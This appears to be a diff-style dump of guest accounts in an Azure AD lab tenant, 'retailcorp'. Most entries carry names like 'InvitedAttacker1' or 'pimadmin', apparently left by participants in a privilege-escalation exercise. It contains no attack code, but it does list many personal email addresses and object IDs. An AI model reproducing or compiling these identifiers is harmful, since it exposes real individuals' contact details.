+InvitedAttacker1       0a0097d7-8bcb-4c88-90d4-d481c845ed8c pim@44444444tnjg4.onmicrosoft.com                       pim_44444444tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttackerfls     3897abe9-3589-46bb-96c9-505a1d986ffd pim@6969.onmicrosoft.com                                pim_6969.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker69      8e24271e-5b26-4a63-abb5-082cbffab141 pim@696969.onmicrosoft.com                              pim_696969.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       72a13593-d812-4819-816e-d6b6216b42f0 pim_aashi07@outlook.com                                 pim_aashi07_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a0293e9c-104b-46b9-a2cc-c65401019608 pim_abu@outlook.com                                     pim_abu_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Alvin Carino           cdafdb94-2a9c-4576-9ed0-3e99d3338360 pim_acarino@outlook.com                                 pim_acarino_outlook.com#EXT#@retailcorp.onmicrosoft.com
+attackeracidburn       cd6b3d3e-4943-44dd-ae46-826d4d727092 pim_acduser@koomegmail.onmicrosoft.com                  pim_acduser_koomegmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Serhiy PIM AD          86ed1129-bc47-468f-98c7-2a3ced6afde7 pim_AD@serhiyrakintsevhotmail.onmicrosoft.com           pim_AD_serhiyrakintsevhotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+AYYYW                  4967c30c-60e2-491e-af01-7aae291542c9 pim@AD2102.onmicrosoft.com                              pim_AD2102.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Anand                  5de6bcb1-5674-4311-93f6-fea6f8dbcd89 pim_anandpavithran_ug.cusat.ac.in#EXT#@anandpavithranu… pim_anandpavithran_ug.cusat.ac.in#EXT#_anandpavithranu#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker111     1a36c04d-2159-4e44-94bd-05b31c5a87c2 pim@asdasd.onmicrosoft.com                              pim_asdasd.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a9f53f74-352b-44e0-bb44-5cf6c1313ccc pim_ATUL999@outlook.com                                 pim_ATUL999_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       3f3d7c86-2c37-4c23-bc78-b0d23a0a6a7d pim@azad.onmicrosoft.com                                pim_azad.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       2f0321d7-42c9-4267-8624-f381f113127b pim@azureadsiva.onmicrosoft.com                         pim_azureadsiva.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e5855607-557e-438d-babd-cc60d5492e04 pim@azurepentestaca.onmicrosoft.com                     pim_azurepentestaca.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       3ba869f8-2770-4d82-91e0-1943aec51569 pim@azurettesting12345.onmicrosoft.com                  pim_azurettesting12345.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       f2786f84-c258-48bc-af37-1cf7461f916b pim_bearjew@outlook.com                                 pim_bearjew_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       80144fa7-1401-452b-8cc1-299e065da443 pim@bhardwajmona31gmail.onmicrosoft.com                 pim_bhardwajmona31gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedBigos           e331177a-173f-4ea7-a2b8-78c80c27e97b pim_bigos@outlook.com                                   pim_bigos_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Pim BRose              efa672a5-0479-41c1-b8e0-1342ec881cb3 pim_bobrose@outlook.com                                 pim_bobrose_outlook.com#EXT#@retailcorp.onmicrosoft.com
+RedTeamBlueTeam        deedadb7-3954-4fb6-aea9-d4d1bd5f5012 pim@chuckbell3gmail.omicrosoft.com                      pim_chuckbell3gmail.omicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       b31ccb5d-57fc-45fd-899d-51ab2c01f7d1 pim@contoso.onmicrosoft.com                             pim_contoso.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+HoaxPimInvite          4001a560-8dc1-492e-af59-d6e1f28e09b9 pim@danhoax.onmincrosoft.com                            pim_danhoax.onmincrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e6a47513-295c-4a76-80a5-0f65ba1f8ff7 pim@danielstech14jjd.onmicrosoft.com                    pim_danielstech14jjd.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker01      21e3be7f-5bcf-4fb5-9ce6-8de613bbd526 pim_david@outlook.com                                   pim_david_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker011     334990d2-ebfe-41b7-b7f4-3bcd4302396d pim_davidhrony@outlook.com                              pim_davidhrony_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e7fa03c6-9603-4352-ae06-51ff5e2934ec pim_faith@outlook.com                                   pim_faith_outlook.com#EXT#@retailcorp.onmicrosoft.com
+rico1989               9ca458c6-af85-4286-bc5d-4ef3ee64a699 pim@funnycorpp.onmicrosoft.com                          pim_funnycorpp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       961be028-67a6-418e-926f-10710e7f753c pim@guntha1.onmicrosoft.com                             pim_guntha1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Gusion                 e3509257-2fb3-4946-9e88-f9ec4b836107 pim_Gusion7@moonlight007.onmicrosoft.com                pim_Gusion7_moonlight007.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attackerburnacid       7db34f29-9cb6-4812-8d5d-7125103916b8 pim_hackburntest.onmicrosoft.com@adminaccone.onmicroso… pim_hackburntest.onmicrosoft.com_adminaccone.onmicroso#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       9a1b83fb-c1a0-4761-971f-8a11fe16dd2c pim_hellogophish@outlook.com                            pim_hellogophish_outlook.com#EXT#@retailcorp.onmicrosoft.com
+hmx1                   55b6518e-198e-40f2-b27a-5c96ea2ba7b1 pim_hmx@outlook.com                                     pim_hmx_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       c7558c7c-8145-4567-9041-3d4137f6a3c2 pim@infosecrick.onmicrosoft.com                         pim_infosecrick.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+knt                    db84a934-d4a5-415b-92b4-b4fee5111f2b pim@kntdwa.onmicrosoft.com                              pim_kntdwa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Roger1337              7be48487-de53-442a-ba03-7e401a1592bf pim@malhunter.onmicrosoft.com                           pim_malhunter.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       68fe546f-9915-4170-a106-f9c458a6ef44 pim_mazharkhan@outlook.com                              pim_mazharkhan_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim                    5f7ea4f7-7e9a-4f16-bbcb-d93fdb805348 pim@mingtenant1.onmicrosoft.com                         pim_mingtenant1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker080420… 75c51d74-1e56-43f1-833f-28fe5726d0e6 pim_mobytoss@outlook.com                                pim_mobytoss_outlook.com#EXT#@retailcorp.onmicrosoft.com
+User01                 94130597-838d-4539-8d1d-54d9008ef7bc pim@mpvardini.onmicrosoft.com                           pim_mpvardini.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+nvitedAttacker5        bb064617-516c-411e-925d-aace0e920e43 pim@mr4nk.onmicrosoft.com                               pim_mr4nk.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedPimLearner      f20499d8-faeb-47e7-91d4-1a66e287e4e4 pim_newlearner@outlook.com                              pim_newlearner_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       3c16cbc5-92cb-4626-850c-4773a7f85f14 pim@oppatnjg4.onmicrosoft.com                           pim_oppatnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim_Pain005            ae7ef92d-4c1f-4e41-8ccd-8dd244fcb850 pim_Pain005@outlook.com                                 pim_Pain005_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim_PAIN05             51c51006-ec63-4e69-8f01-3d0a2f1b62a0 pim_PAIN05@outlook.com                                  pim_PAIN05_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        929bf48b-da8d-4eda-a0e6-64f7121fa834 pim_pims@outlook.com                                    pim_pims_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        d9f8f0bc-a46c-496b-bf7c-f7fbdc5a4e45 pim_pimse@outlook.com                                   pim_pimse_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       abcdd5ee-f267-4406-b8e2-50e62097429a pim_PINE@outlook.com                                    pim_PINE_outlook.com#EXT#@retailcorp.onmicrosoft.com
+JPAttacker             dc9edc13-fc15-4849-84fd-7fb0f5654b09 pim@pitcairntest.onmicrosft.com                         pim_pitcairntest.onmicrosft.com#EXT#@retailcorp.onmicrosoft.com
+SillyBilly1            fae52fdf-5f3e-4c50-897b-5e1a6bc403fa pim_pmyazz@outlook.com                                  pim_pmyazz_outlook.com#EXT#@retailcorp.onmicrosoft.com
+PimPom                 19740871-055e-4bc6-87a5-03bbf6900744 pim_pom@yopmail.com                                     pim_pom_yopmail.com#EXT#@retailcorp.onmicrosoft.com
+Pratik                 c9e09a97-db71-4121-9f40-4d578b056bac pim@pratik.onmicrosoft.com                              pim_pratik.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pwned                  40b1b7ec-9744-4ddd-9679-c20d8d0d0778 pim_pwned@outlook.com                                   pim_pwned_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e319d0ec-0add-4a56-90b1-f3bcb361a9fe pim@qwerty.onmicrosoft.com                              pim_qwerty.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       de405c45-44bf-46d1-973c-019e201a67d3 pim@qwerty1pim.onmicrosoft.com                          pim_qwerty1pim.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        f7bb24bf-1649-4cf1-9157-af3907fe2617 pim@r00tkielabs.onmicrosoft.com                         pim_r00tkielabs.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    240003cd-4743-4d31-9a4c-0577fee6d44b pim@rajaja.onmicrosoft.com                              pim_rajaja.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Raj Humy           7ab9b29b-75ba-4f67-a508-23068bf6851c pim_rajhumy@outlook.com                                 pim_rajhumy_outlook.com#EXT#@retailcorp.onmicrosoft.com
+PIM Random12           be9c0e8f-9365-47a6-ad8c-6266fd123245 pim_random12@outlook.com                                pim_random12_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       bfdeab1d-37d3-4d60-bdad-87fd77e21125 pim_rjhumy@outlook.com                                  pim_rjhumy_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Test1                  c8418392-b40b-446d-b927-ae2e68556bdd pim@robincarranzaweb.onmicrosoft.com                    pim_robincarranzaweb.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       56ba8d28-a2a5-495e-b84d-e3b4b21dcc01 pim@saurabhail07.onmicrosoft.com                        pim_saurabhail07.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       c9317ea7-3fd9-47dd-9598-2fbbc0978f47 pim@securityx1337.onmicrosoft.com                       pim_securityx1337.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+redAttacker304         88c67a28-a4f5-4fd8-983e-e3bd1fdd1077 pim_student304@outlook.com                              pim_student304_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       3d043a5b-7b52-4fe7-a43e-3e946cbd3f07 pim_subin@outlook.com                                   pim_subin_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttackerfls     0373ed9c-4fd1-40db-aa50-b386943c676d pim@t6969.onmicrosoft.com                               pim_t6969.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker12      31f9020f-7e76-43db-a32f-a50942010e73 pim_test@outlook.fr                                     pim_test_outlook.fr#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker12      cdce7965-4f3d-4cb1-9158-e9916553d3dd pim_test@outlook.com                                    pim_test_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       f94d5640-4b9c-4f58-83cf-67c414368f7e pim@testrony786.onmicrosoft.com                         pim_testrony786.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker12      db819f62-2e84-4fbf-986d-25314bfbd7ac pim_testrtl11@outlook.com                               pim_testrtl11_outlook.com#EXT#@retailcorp.onmicrosoft.com
+AcidBurnDK             0bd94212-1b3c-44cc-9861-6b5b40730592 pim_tn9e5.onmicrosoft.com#EXT#@adminaccone.onmicrosoft… pim_tn9e5.onmicrosoft.com#EXT#_adminaccone.onmicrosoft#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       dab73797-1d2a-44ab-9f1c-7ea4ae3a5654 pim@tndwdw4.onmicrosoft.com                             pim_tndwdw4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       8f123238-724c-43be-8995-ca0a893e381f pim@tnj44.onmicrosoft.com                               pim_tnj44.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker14      b1804205-8550-4571-a4fe-e96c7c5db6ff pim@tnjg14.onmicrosoft.com                              pim_tnjg14.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       4fd28287-1af4-40fd-8bbd-d03f130045e2 pim@tnjg3.onmicrosoft.com                               pim_tnjg3.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       cecc2fb7-64e9-4eab-a94c-f0b4e59e1377 pim@tnjg5.onmicrosoft.com                               pim_tnjg5.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       2e99e79b-53c2-4f3b-bd83-2f63aac990d2 pim@tnjg6.onmicrosoft.com                               pim_tnjg6.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       64e43d39-9ab3-4362-88e6-6572f8676d86 pim@tnjg666.onmicrosoft.com                             pim_tnjg666.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       2180d8c6-0234-4db4-bda8-1586c2d13583 pim@tnjg7.onmicrosoft.com                               pim_tnjg7.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        e238c488-4473-445c-b84f-5494a586b7da pim@tnjj99.onmicrosoft.com                              pim_tnjj99.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker643763  70d26356-a561-4cd4-bea1-394e16599434 pim@totallsecurecorporation.onmicrosoft.com             pim_totallsecurecorporation.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimush                 27243e0a-4390-4ff7-a9ee-62f003b42591 pim_ush@liorcorp.onmicrosoft.com                        pim_ush_liorcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a7fe61fe-11a9-4374-9837-ae88e1295691 pim_Vikash27@outlook.com                                pim_Vikash27_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       8709757a-9886-4776-89f9-358151796e8c pim@w00daz.onmicrosoft.com                              pim_w00daz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       082ca087-b4dd-48ea-bdeb-72b7f267fadc pim@wdssa.onmicrosoft.com                               pim_wdssa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    ebddac0a-10ba-4193-8911-d63e8521dccc pim@wolfatolfden.onmicrosoft.com                        pim_wolfatolfden.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim_yonko10            09168655-d8c5-4711-b2d6-c2d222e900fb pim_yonko10@outlook.com                                 pim_yonko10_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim_yonko11            51e60ab2-41f5-4017-9d7c-f78b5705364d pim_yonko11@outlook.com                                 pim_yonko11_outlook.com#EXT#@retailcorp.onmicrosoft.com
+ItsMeAttacker          aee1967d-7bc7-47e2-9bea-f9a8a700cb0e pim_you@outlook.com                                     pim_you_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Hacker007              d64f2c27-ff27-4d0a-91d9-ec5c422d15d4 pim@zbtbr.onmicrosoft.com.onmicrosoft.com               pim_zbtbr.onmicrosoft.com.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       eee7bab2-7ae8-4569-a257-b9bb726d6cf6 pim0000001@tcxzl.onmicrosoft.com                        pim0000001_tcxzl.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimattack              3c2332b6-abd5-4c22-922f-3c4d9bd6e4d3 pim00001@tcxzl.onmicrosoft.com                          pim00001_tcxzl.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    af8b444b-03e1-4701-a5ac-ca67c5744553 pim009@miladmin.onmicrosoft.com                         pim009_miladmin.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim01                  42e0924b-15f3-48e0-9a7f-bf7f7218535e pim01@0xjslab.onmicrosoft.com                           pim01_0xjslab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim 01                 d491b90f-676f-41c6-9391-804b96d08d95 pim01@bebeguy.onmicrosoft.com                           pim01_bebeguy.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    a41896a6-260f-487a-abe5-12577c04f33c pim01@ifdelices.onmicrosoft.com                         pim01_ifdelices.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim 02                 d2f5df2a-383e-4fcb-bb2e-5fa34ded677b Pim02@rohitb96.onmicrosoft.com                          Pim02_rohitb96.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Adversary01            d2e06766-90d4-4a5b-9345-2f4861e44073 pim0909@tnjg4.onmicrosoft.com                           pim0909_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    b03879e2-79b3-4c19-95b5-25cd747158ff pim1@bloodsucker.onmicrosoft.com                        pim1_bloodsucker.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim1                   4585ac9a-c93d-43b9-8c07-563a20c222e8 pim1@naveenhaxor.onmicrosoft.com                        pim1_naveenhaxor.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       fc4d23cf-4570-45a5-ab9e-70e594071316 pim11attacker@outlook.com                               pim11attacker_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim1212                fa024384-dbfb-4ab7-bdba-92bf86dae242 pim1212@demofj111.onmicrosoft.com                       pim1212_demofj111.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim123                 3cfc6d69-6357-44db-89cf-867c313fea78 pim123@6psxx1.onmicrosoft.com                           pim123_6psxx1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Test22                 dbff9eca-8802-41e6-9f17-71567bf92f8d pim123@pracharsh.onmicrosoft.com                        pim123_pracharsh.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim123                 f4aa3ed6-8728-40d8-8154-58c6eca18e88 pim123@sanderbo.onmicrosoft.com                         pim123_sanderbo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PimCypher              20f685d0-e07b-476d-90a3-3d3f1ae6d970 pim123@msitip.com                                       pim123_msitip.com#EXT#@retailcorp.onmicrosoft.com
+tata                   a7dc7b39-abba-472a-af5e-192fc1823ec1 pim1232@sniper007.onmicrosoft.com                       pim1232_sniper007.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PimCypher1             8b2f3645-0a77-48f7-8111-5bf447787ff2 pim1234@msitip.com                                      pim1234_msitip.com#EXT#@retailcorp.onmicrosoft.com
+PimPom123              804bab75-c405-4ca7-b539-526c1ebc08e0 pim123pom@outlook.com                                   pim123pom_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       068951bf-e36e-4d98-936b-08f7de9d5c9a pim13372025@outlook.com                                 pim13372025_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       4436dfb0-4d3c-4cd4-8a7c-34f51744cf4f pim169999878@tnjg4.onmicrosoft.com                      pim169999878_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        62af8d83-7c33-49a0-904a-f21dfe2e27bb pim2026attack@outlook.com                               pim2026attack_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimmfumeniod           3394db8a-e795-42f5-b00d-202133f7384f pim33@badmashhhh.onmicrosoft.com                        pim33_badmashhhh.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InviteATtacker1        0866d6c4-9efa-49f5-828c-a92a06e92ec6 pim33@tnjgh4.onmicrosoft.com                            pim33_tnjgh4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim4                   cdb82dc6-ceca-40ad-8cd4-0f287e4a38ce pim4@dh0ckdomain1.onmicrosoft.com                       pim4_dh0ckdomain1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       1173d052-a2d1-4177-973d-affd035e0f3d pim6022@shiva8944.onmicrosoft.com                       pim6022_shiva8944.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       b2827717-c901-4cac-b3cb-21aabf7d603e pim6022@shiva8944.onmicrosoft.com.onmicrosoft.com       pim6022_shiva8944.onmicrosoft.com.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+TestAz                 0ee36565-912e-485f-bb7f-110ae0938051 pim671@outlook.com                                      pim671_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim 77                 9e95c597-6202-4209-b467-457362d6a94a pim77@seccorpcompany.onmicrosoft.com                    pim77_seccorpcompany.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       25946085-a7d9-4a1a-a008-6f024e641ecb pim8944@shiva8944.onmicrosoft.com.onmicrosoft.com       pim8944_shiva8944.onmicrosoft.com.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+dada                   0a71cf1d-3645-4c90-a7fb-8ef28dde9b49 pima@ispiriaz.onmicrosoft.com                           pima_ispiriaz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+knt                    26fdb461-0290-449a-8ccd-82b485c51823 pima@kntdwa.onmicrosoft.com                             pima_kntdwa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin-test-user     93a10e7a-0891-4e87-908b-dd1f4abc8237 pimadmin-test-user@protonmail.com                       pimadmin-test-user_protonmail.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               c7074c06-49d8-481f-b05e-4c8c1c41e43d pimadmin@2r0fyw.onmicrosoft.com                         pimadmin_2r0fyw.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIMAdmin               c5650334-dbe8-4e91-9d8c-75411644df59 pimadmin@8dlp6l.onmicrosoft.com                         pimadmin_8dlp6l.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Admin              e8c57be7-9351-48c6-ad02-22dd3d779332 pimadmin@adamnurudinihotmail.onmicrosoft.com            pimadmin_adamnurudinihotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    63ad25de-009a-4278-8930-366aeaed952f pimadmin@adhackpro.onmicrosoft.com                      pimadmin_adhackpro.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 9949d14c-3ccc-4927-b9bc-d8bc96c229a8 pimadmin@akamal.onmicrosoft.com                         pimadmin_akamal.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               6167e904-1877-44b6-8c4a-9bf80e011c08 pimadmin@asmi123.onmicrosoft.com                        pimadmin_asmi123.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               633cdd0e-46b5-48e3-a9a7-064cc97f04db pimadmin@azureadsiva.onmicrosoft.com                    pimadmin_azureadsiva.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               9f2030c4-38d9-47b5-9241-d757e9f9bf5a pimadmin@azurelab1337.onmicrosoft.com                   pimadmin_azurelab1337.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pimadmin               fc308b96-cd58-4817-8ead-99472e6264b1 pimadmin@azurenoob.onmicrosoft.com                      pimadmin_azurenoob.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    502e8922-5e46-42e6-8cde-bbf4895608b3 pimadmin@azurepentestaca.onmicrosoft.com                pimadmin_azurepentestaca.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Admin              e6493081-6ddb-4347-89a2-e1b5b6202fc3 pimadmin@bluecorp3.onmicrosoft.com                      pimadmin_bluecorp3.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Timo Werner            f8faaee5-d523-4222-b789-e0693730fbf2 pimadmin@cyberhive01.onmicrosoft.com                    pimadmin_cyberhive01.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ak                     91be6bd8-dca3-4515-9437-1f5256c8b6e5 pimadmin@ekotip.onmicrosoft.com                         pimadmin_ekotip.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Tony                   1006e550-4d76-4472-90e1-c7ff7f0e1143 pimadmin@gabrujas.onmicrosoft.com                       pimadmin_gabrujas.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               985d20d7-a726-4ad8-946e-17e0afc7df29 pimadmin@ghostincsac.onmicrosoft.com                    pimadmin_ghostincsac.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Admin              99f95af4-4a96-4598-b7fe-36648f83b218 pimadmin@jasoriyaenterprise.onmicrosoft.com             pimadmin_jasoriyaenterprise.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               2336f81e-d7fa-433e-8b18-c7eb1ab3fa85 pimadmin@leetwhitehatazure.onmicrosoft.com              pimadmin_leetwhitehatazure.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               b4773e64-4b00-4c0b-a625-2092070c0bfd pimadmin@leo4j.onmicrosoft.com                          pimadmin_leo4j.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Admin              868bdc7e-cfe8-4237-824f-797dd9c5996c PIMAdmin@luemmelsec.onmicrosoft.com                     PIMAdmin_luemmelsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+важный чел2            05ce0f51-d4ed-4c6a-984a-c833dff96f1e pimadmin@mishartbrooutlook.onmicrosoft.com              pimadmin_mishartbrooutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               644419cf-073a-4601-9c4b-1b0fe6da1007 pimadmin@nemesisdemo.onmicrosoft.com                    pimadmin_nemesisdemo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pentest lab            877e70d3-3dde-4cbb-aad9-b483fb3bda09 pimadmin@pentest101.onmicrosoft.com                     pimadmin_pentest101.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               f3855abb-eaf9-4100-bb7d-7ece1b070d98 pimadmin@pimsnouyt.onmicrosoft.com                      pimadmin_pimsnouyt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               768118a4-5baf-472b-958f-383112135dd8 pimadmin@redteamcorp.onmicrosoft.com                    pimadmin_redteamcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM admin              7650679b-7e0d-4d96-be98-ae89e54a64e0 pimadmin@rubixseclab.onmicrosoft.com                    pimadmin_rubixseclab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               2d409afb-b6b5-4c03-8400-362379d783d8 pimadmin@sanderbo.onmicrosoft.com                       pimadmin_sanderbo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim1337                6feea265-86c0-421b-9fe8-c07e4d3cacb7 pimadmin@securityx1337.onmicrosoft.com                  pimadmin_securityx1337.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       d09bf439-71bc-4f05-8069-501071117043 pimadmin@sharklasers.com                                pimadmin_sharklasers.com#EXT#@retailcorp.onmicrosoft.com
+pim                    cffc3a51-da04-4e1a-8844-a84e7ed781f7 pimadmin@shiva8944.onmicrosoft.com                      pimadmin_shiva8944.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+attacker               839f7bf7-002d-4ca6-ada8-cca7de683b40 pimadmin@sniper007.onmicrosoft.com                      pimadmin_sniper007.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Admin              41c7ddb8-4e6d-4dcd-ab70-8977c3ac7dc3 pimadmin@synrst.onmicrosoft.com                         pimadmin_synrst.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Neon               5156d775-a1eb-4205-aa01-256d5fbced67 pimadmin@techiekarthik.onmicrosoft.com                  pimadmin_techiekarthik.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+SAM                    62c16df8-90f3-4d96-aa80-99b5b4e5dc78 pimadmin@urbanhit.onmicrosoft.com                       pimadmin_urbanhit.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
